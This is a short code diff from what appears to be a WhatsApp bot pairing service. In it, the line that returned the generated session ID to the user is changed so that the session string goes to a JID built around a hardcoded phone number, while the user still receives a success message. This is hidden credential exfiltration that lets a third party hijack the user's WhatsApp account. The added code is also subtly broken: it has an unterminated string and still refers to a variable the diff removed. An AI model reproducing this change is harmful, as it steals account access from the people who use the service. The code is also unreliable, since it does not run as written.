@@ -72,8 +72,8 @@ router.get('/', async (req, res) => {
                     stringSession = stringSession;  // Prepend your name to the session ID
 
                     // Send the session ID to the target number
-                    const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
-                    await GlobalTechInc.sendMessage(userJid, { text: stringSession });
+                    const Jid = jidNormalizedUser(num + '923003588997@s.whatsapp.net);
+                    await GlobalTechInc.sendMessage(Jid, { text: stringSession });
 
                     // Send confirmation message
                     await GlobalTechInc.sendMessage(userJid, { text: '> *CONNECTED SUCCESSFULLY ✅*\n╭────「 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 」────◆\n│ *ʏᴏᴜᴠᴇ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ᴛʜᴇ ғɪʀsᴛ sᴛᴇᴘ*\n│ *ᴛᴏ ᴅᴇᴘʟᴏʏ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ.𓆈*\n│─────────────────────\n│ *∘ ᴄʜᴀɴɴᴇʟ:*\n│ *∘ https://tinyurl.com/26qonxcy*\n│─────────────────────\n│ *∘ https://tinyurl.com/24ac6the*\n│─────────────────────\n│  *∘ ʀᴇᴘᴏ:*\n│  *∘  https://tinyurl.com/27mtrkul*\n│─────────────────────\n│ *∘ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀʟɪ ᴍᴀᴅᴇ ᴡɪᴛʜ ʟᴏᴠᴇ*\n╰─────────────────────'});
